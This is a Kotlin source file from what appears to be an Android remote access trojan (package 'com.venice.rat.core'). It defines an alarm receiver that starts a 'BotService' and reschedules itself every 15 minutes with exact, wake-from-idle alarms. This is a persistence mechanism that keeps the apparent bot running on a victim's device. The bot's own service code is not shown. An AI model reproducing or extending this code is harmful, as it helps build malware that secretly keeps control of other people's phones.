package com.venice.rat.core

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build

class AlarmReceiver : BroadcastReceiver() {
    companion object {
        fun set(c: Context, after: Long) {
            runCatching {
                val am = c.getSystemService(Context.ALARM_SERVICE) as AlarmManager
                val pi = PendingIntent.getBroadcast(c, 7, Intent(c, AlarmReceiver::class.java),
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
                if (Build.VERSION.SDK_INT >= 23)
                    am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + after, pi)
                else am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + after, pi)
            }
        }
    }

    override fun onReceive(c: Context, i: Intent) {
        BotService.start(c)
        set(c, 15 * 60_000)
    }
}
